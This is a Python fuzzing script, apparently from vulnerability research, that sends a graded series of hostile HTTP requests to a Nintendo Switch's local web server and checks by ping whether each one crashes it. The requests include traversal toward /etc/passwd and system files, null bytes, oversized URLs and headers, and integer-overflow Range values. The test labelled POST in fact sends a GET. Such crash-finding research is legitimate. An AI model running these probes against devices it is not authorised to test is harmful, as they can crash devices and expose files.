#!/usr/bin/env python3
"""
lp2p HTTP Crash Finder — sends one request at a time with ping checks
to pinpoint exactly which HTTP request crashes the Switch.

Usage:
    sudo python3 -Iu lp2p_http_crashfinder.py --iface wlp5s0
"""

import subprocess
import socket
import time
import json
import sys
import argparse
import urllib.request
import urllib.error
from pathlib import Path
from datetime import datetime, timezone

EVIDENCE_DIR = Path(__file__).parent.parent / "evidence" / "lp2p_dhcp"
SWITCH_IP = "192.168.0.1"
BASE = f"http://{SWITCH_IP}"


def ping_alive():
    r = subprocess.run(["ping", "-c", "1", "-W", "2", SWITCH_IP],
                       capture_output=True)
    return r.returncode == 0


def http_get(path, headers=None, timeout=3):
    """Send HTTP GET, return (status_code, body_len, response_headers) or (0, 0, None) on failure."""
    url = f"{BASE}/{path}" if not path.startswith("http") else path
    req = urllib.request.Request(url)
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read()
            return resp.status, len(body), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, 0, None
    except Exception:
        return 0, 0, None


def raw_http(request_line, headers_str="", timeout=3):
    """Send a raw HTTP request string. Returns (response_bytes_len, first_line) or (0, 'NO_RESPONSE')."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((SWITCH_IP, 80))
        raw = f"{request_line}\r\n"
        if headers_str:
            raw += headers_str
        if not raw.endswith("\r\n\r\n"):
            raw += "\r\n"
        sock.sendall(raw.encode())
        data = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
            except socket.timeout:
                break
        first_line = data.split(b"\r\n")[0].decode("ascii", errors="replace") if data else "NO_RESPONSE"
        return len(data), first_line
    except Exception as e:
        return 0, str(e)
    finally:
        sock.close()


def test_case(name, func, delay=2):
    """Run one test case with pre/post ping checks."""
    if not ping_alive():
        print(f"  [SKIP] {name} — Switch not reachable")
        return {"name": name, "status": "skip_unreachable"}

    print(f"  [{name}] sending...", end=" ", flush=True)
    try:
        result = func()
    except Exception as e:
        result = {"error": str(e)}
    print(f"result={result}", end=" ", flush=True)

    time.sleep(0.5)
    alive = ping_alive()
    print(f"ping={'OK' if alive else 'DEAD'}")

    entry = {"name": name, "result": result, "alive_after": alive}

    if not alive:
        print(f"\n  *** CRASH DETECTED at [{name}] ***")
        print(f"  Waiting 20s to confirm...")
        time.sleep(20)
        recovered = ping_alive()
        entry["recovered_20s"] = recovered
        if not recovered:
            print(f"  *** CONFIRMED CRASH — Switch is down ***")
        else:
            print(f"  Switch recovered")

    time.sleep(delay)
    return entry


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--iface", required=True)
    parser.add_argument("--start", type=int, default=0, help="Start from test N")
    args = parser.parse_args()

    print("=" * 60)
    print("  lp2p HTTP Crash Finder")
    print("=" * 60)
    print(f"  Target: {SWITCH_IP}")
    print(f"  Time: {datetime.now(timezone.utc).isoformat()}")
    print("=" * 60)

    if not ping_alive():
        print("[!] Switch not reachable")
        sys.exit(1)
    print("[+] Switch alive\n")

    # Define test cases — ordered from safest to most dangerous
    tests = [
        # Group 1: Basic requests
        ("GET /index.html", lambda: http_get("index.html")),
        ("GET /data.json", lambda: http_get("data.json")),
        ("GET /styles/index.css", lambda: http_get("styles/index.css")),
        ("GET /js/index.js", lambda: http_get("js/index.js")),

        # Group 2: 404 paths
        ("GET /nonexistent", lambda: http_get("nonexistent")),
        ("GET /img/nonexistent.jpg", lambda: http_get("img/nonexistent.jpg")),

        # Group 3: Path traversal (simple)
        ("GET /img/../data.json", lambda: http_get("img/../data.json")),
        ("GET /../data.json", lambda: http_get("../data.json")),

        # Group 4: Path traversal (deep)
        ("GET /../../data.json (depth 2)", lambda: http_get("../../data.json")),
        ("GET /../../../data.json (depth 3)", lambda: http_get("../../../data.json")),
        ("GET /../../../../data.json (depth 4)", lambda: http_get("../../../../data.json")),

        # Group 5: Path traversal (outside webroot attempts)
        ("GET /img/../../etc/passwd", lambda: http_get("img/../../etc/passwd")),
        ("GET /img/../../../system", lambda: http_get("img/../../../system/Contents/registered")),

        # Group 6: Encoded traversal
        ("GET /img/%2e%2e/data.json", lambda: http_get("img/%2e%2e/data.json")),
        ("GET /img/..%2f..%2fdata.json", lambda: http_get("img/..%2f..%2fdata.json")),
        ("GET /%2e%2e%2fdata.json", lambda: http_get("%2e%2e%2fdata.json")),
        ("GET /img/....//....//data.json", lambda: http_get("img/....//....//data.json")),

        # Group 7: Null bytes
        ("GET /img/../%00.jpg", lambda: http_get("img/../%00.jpg")),
        ("GET /data.json%00.html", lambda: http_get("data.json%00.html")),

        # Group 8: Long URLs (escalating)
        ("GET /AAA...128", lambda: http_get("A" * 128)),
        ("GET /AAA...200", lambda: http_get("A" * 200)),
        ("GET /AAA...240", lambda: http_get("A" * 240)),
        ("GET /AAA...250", lambda: http_get("A" * 250)),
        ("GET /AAA...256", lambda: http_get("A" * 256)),
        ("GET /AAA...300", lambda: http_get("A" * 300)),
        ("GET /AAA...512", lambda: http_get("A" * 512)),
        ("GET /AAA...1024", lambda: http_get("A" * 1024)),
        ("GET /AAA...2048", lambda: http_get("A" * 2048)),
        ("GET /AAA...4096", lambda: http_get("A" * 4096)),

        # Group 9: Long headers
        ("Host: 1024 chars", lambda: http_get("data.json", {"Host": "A" * 1024})),
        ("Host: 4096 chars", lambda: http_get("data.json", {"Host": "A" * 4096})),
        ("User-Agent: 4096 chars", lambda: http_get("data.json", {"User-Agent": "A" * 4096})),
        ("Cookie: 4096 chars", lambda: http_get("data.json", {"Cookie": "A" * 4096})),
        ("X-Custom: 8192 chars", lambda: http_get("data.json", {"X-Custom": "A" * 8192})),

        # Group 10: Many headers
        ("50 custom headers", lambda: http_get("data.json",
            {f"X-H{i}": "A" * 100 for i in range(50)})),
        ("100 custom headers", lambda: http_get("data.json",
            {f"X-H{i}": "A" * 100 for i in range(100)})),

        # Group 11: Range header
        ("Range: bytes=0-100", lambda: http_get("data.json", {"Range": "bytes=0-100"})),
        ("Range: bytes=0-999999", lambda: http_get("data.json", {"Range": "bytes=0-999999"})),
        ("Range: 10 ranges", lambda: http_get("data.json",
            {"Range": "bytes=" + ",".join(f"{i}-{i}" for i in range(10))})),
        ("Range: 100 ranges", lambda: http_get("data.json",
            {"Range": "bytes=" + ",".join(f"{i}-{i}" for i in range(100))})),
        ("Range: bytes=0-4294967295", lambda: http_get("data.json",
            {"Range": "bytes=0-4294967295"})),
        ("Range: bytes=0-4294967296", lambda: http_get("data.json",
            {"Range": "bytes=0-4294967296"})),
        ("Range: bytes=0-18446744073709551615", lambda: http_get("data.json",
            {"Range": "bytes=0-18446744073709551615"})),
        ("Range: bytes=0-18446744073709551616", lambda: http_get("data.json",
            {"Range": "bytes=0-18446744073709551616"})),
        ("Range: bytes=0-99999999999999999999", lambda: http_get("data.json",
            {"Range": "bytes=0-99999999999999999999"})),

        # Group 12: Malformed HTTP
        ("Raw: no Host header", lambda: raw_http("GET /data.json HTTP/1.1")),
        ("Raw: HTTP/0.9", lambda: raw_http("GET /data.json")),
        ("Raw: huge method", lambda: raw_http("A" * 1024 + " /data.json HTTP/1.1",
            "Host: 192.168.0.1\r\n")),

        # Group 13: POST with body
        ("POST /data.json (empty)", lambda: http_get("data.json")),
    ]

    results = []
    for i, (name, func) in enumerate(tests):
        if i < args.start:
            continue
        entry = test_case(f"#{i:02d} {name}", func)
        results.append(entry)

        if not entry.get("alive_after", True) and not entry.get("recovered_20s", True):
            print(f"\n  FATAL: Switch crashed at test #{i}: {name}")
            break

    # Save
    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    path = EVIDENCE_DIR / "crashfinder_results.json"
    with open(path, "w") as f:
        json.dump({
            "test": "http_crashfinder",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "results": results,
        }, f, indent=2, default=str)
    print(f"\nEvidence saved: {path}")


if __name__ == "__main__":
    main()
